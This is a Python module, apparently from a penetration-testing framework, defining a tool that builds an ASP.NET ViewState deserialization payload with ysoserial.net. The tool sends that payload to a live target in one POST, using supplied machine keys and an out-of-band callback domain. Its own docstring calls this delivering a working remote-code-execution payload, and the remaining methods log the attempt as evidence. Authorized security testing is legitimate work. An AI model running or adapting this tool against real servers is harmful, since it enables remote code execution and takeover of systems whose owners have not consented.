"""
Generates an ASP.NET ViewState gadget-chain payload with ysoserial.net
(run under Wine -- see tradecraft/adapters/deserialization_probe_dotnet/
execute.py's own docstring for why Linux Mono can't run this) and
delivers it as the __VIEWSTATE form field in one POST. Classified as
destructive: true (it delivers a working RCE payload against a live
target). See tradecraft/adapters/deserialization_probe_dotnet/ for why
this tool reports no synchronous "vulnerable" verdict.
"""
from __future__ import annotations

from typing import Any, Dict, List, Tuple

from tradecraft.adapters.deserialization_probe_dotnet import execute as dpd_execute
from tradecraft.adapters.deserialization_probe_dotnet import parse as dpd_parse
from tradecraft.tools.base import Tool


class DeserializationProbeDotnet(Tool):
    tool_id = "deserialization_probe_dotnet"

    def is_available(self) -> bool:
        # No required_binary in the contract -- "wine64" on PATH alone
        # wouldn't prove the exe or its bootstrapped WINEPREFIX (with a
        # real .NET Framework installed) exist too, same gap
        # phpggc's/deserialization_probe's own is_available() already
        # guard against for their own script/jar dependencies.
        return dpd_execute.find_runtime() is not None

    def run(
        self,
        target: str,
        oob_domain: str,
        payload_type: str = "",
        validation_key: str = "",
        validation_algorithm: str = "",
        decryption_key: str = "",
        decryption_algorithm: str = "",
        path: str = "",
        apppath: str = "",
    ) -> Dict[str, Any]:
        raw = dpd_execute.execute(
            target=target,
            oob_domain=oob_domain,
            payload_type=payload_type,
            validation_key=validation_key,
            validation_algorithm=validation_algorithm,
            decryption_key=decryption_key,
            decryption_algorithm=decryption_algorithm,
            path=path,
            apppath=apppath,
        )
        parsed = dpd_parse.parse_result(raw)

        if not parsed.get("error"):
            # Always keep full evidence of what was sent, regardless of
            # outcome -- this tool can never itself confirm or rule out
            # execution (see parse.py's docstring), so the one thing it
            # owes a later reviewer is an exact record of the attempt,
            # same principle webshell_upload/auth_bootstrap/
            # deserialization_probe already apply to their own
            # destructive actions.
            parsed["_full_evidence"] = {
                "target": parsed.get("target"),
                "mode": parsed.get("mode"),
                "gadget": parsed.get("gadget"),
                "oob_domain": parsed.get("oob_domain"),
                "status_code": parsed.get("status_code"),
                "payload": raw.payload,
            }

        return parsed

    def extract_evidence(self, params: Dict[str, Any], result: Dict[str, Any]) -> Tuple[str, Any] | None:
        target = params.get("target", "")
        full = result.pop("_full_evidence", None)
        if not target or full is None:
            return None
        host, _ = dpd_parse.parse_host_port(target)
        return host, full

    def extract_facts(self, params: Dict[str, Any], result: Dict[str, Any]) -> List[Dict[str, Any]]:
        # No synchronous "vulnerable" signal exists for this tool (see
        # parse.py's own docstring) -- only a "this host:port already
        # had a .NET deserialization attempt sent" marker, same
        # per-class tested-field convention sqli_tested/xss_tested/
        # cmdi_tested/java_deserialization_tested already established.
        target = params.get("target", "")
        if not target or result.get("error"):
            return []
        host, port = dpd_parse.parse_host_port(target)
        fact: Dict[str, Any] = {
            "host": host,
            "port": port,
            "dotnet_deserialization_tested": True,
            "dotnet_deserialization_mode": result.get("mode"),
            "dotnet_deserialization_oob_domain": result.get("oob_domain"),
        }
        if result.get("evidence_id"):
            fact["evidence"] = result["evidence_id"]
        return [fact]
